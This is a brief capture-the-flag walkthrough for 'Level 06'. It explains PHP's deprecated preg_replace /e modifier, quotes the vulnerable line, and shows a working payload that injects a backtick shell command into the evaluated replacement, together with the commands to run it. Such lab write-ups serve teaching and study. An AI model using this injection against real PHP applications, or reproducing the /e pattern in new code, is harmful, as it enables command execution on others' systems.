# Level 06

Old PHP gotcha with preg_replace and /e.

Vulnerable behavior:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

/e means the replacement is evaluated as PHP code.

Quick check:

```bash
echo 'hello world' > /tmp/exploit06
./level06 /tmp/exploit06
```

Exploit payload:

```bash
echo '[x ${`getflag`}]' > /tmp/exploit06
./level06 /tmp/exploit06
```

Expected behavior:

- You may see a terminal warning like `No entry for terminal type "xterm-kitty"`.
- You usually get a PHP notice about an undefined variable.
- The token still appears inside that notice line.

So yeah, user-controlled data turned into executable code.
